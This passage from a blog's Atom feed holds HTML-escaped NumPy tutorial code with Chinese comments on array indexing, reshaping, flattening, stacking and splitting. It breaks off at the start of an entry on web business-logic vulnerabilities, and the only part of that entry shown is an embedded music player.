punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;索引结果为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 索引第 2、3 行中第 0、2、3 列的元素&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;103&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;104&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mask &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;array&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; dtype&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bool&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;105&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# mask 是一个布尔数组，它索引第 1、3 行中第 2 列的元素&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;106&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;索引结果为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;mask&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;107&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;108&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-21&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;109&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;arange&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 创建一维数组&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;110&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;创建的一维数组为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;111&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;新的一维数组为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;reshape&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 设置数组的形状&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;112&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;数组维度为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;reshape&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ndim&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 查看数组维度&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;113&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;114&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-22&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;115&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;arange&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;reshape&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;116&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;创建的二维数组为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;117&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;数组展平后为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ravel&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;118&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;119&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;120&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;数组展平为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;flatten&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 横向展平&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;121&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;数组展平为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;flatten&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;F&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 纵向展平&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;122&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;123&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-24&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;124&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arr1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;arange&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;reshape&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;125&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;创建的数组1为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;126&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;127&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arr2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; arr1 &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;128&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;创建的数组2为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;129&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;横向组合为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;hstack&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;arr1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# hstack 函数横向组合&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;130&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;131&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-25&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;132&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;纵向组合为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;vstack&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;arr1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# vstack 函数纵向组合&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;133&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;134&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-26&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;135&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;横向组合为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;concatenate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;arr1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; axis&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# concatenate 函数横向组合&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;136&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;纵向组合为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;concatenate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;arr1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; axis&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# concatenate 函数纵向组合&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;137&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;138&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-27&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;139&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;arange&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;reshape&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;140&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;创建的二维数组为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;141&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;横向分割为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;hsplit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;arr&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# hsplit 函数横向分割&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;142&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;143&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-28&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;144&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;纵向分割为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;vsplit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;arr&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# vsplit 函数纵向分割&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;145&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;146&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-29&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;147&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;横向分割为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;split&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;arr&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; axis&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# split 函数横向分割&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;148&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;纵向分割为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;split&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;arr&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; axis&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# split 函数纵向分割&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
        <category term="python" scheme="https://self-ferry.github.io/categories/python/" />
        <category term="数据分析" scheme="https://self-ferry.github.io/tags/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/" />
        <updated>2021-03-23T11:07:40.000Z</updated>
    </entry>
    <entry>
        <id>https://self-ferry.github.io/2021/03/09/web%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</id>
        <title>web漏洞-业务逻辑漏洞</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/03/09/web%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
        <content type="html">&lt;p&gt;&lt;span class=&#34;label success&#34;&gt;✔️来首音乐吧&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;media-container&#34;&gt;&lt;div class=&#34;player&#34; data-type=&#34;audio&#34; data-src=&#39;[{&#34;title&#34;:&#34;列表 1&#34;,&#34;list&#34;:[&#34;https://music.163.com/#/song?id=491097414&#34;]}]&#39;&gt;&lt;/div&gt;&lt;/div&gt;
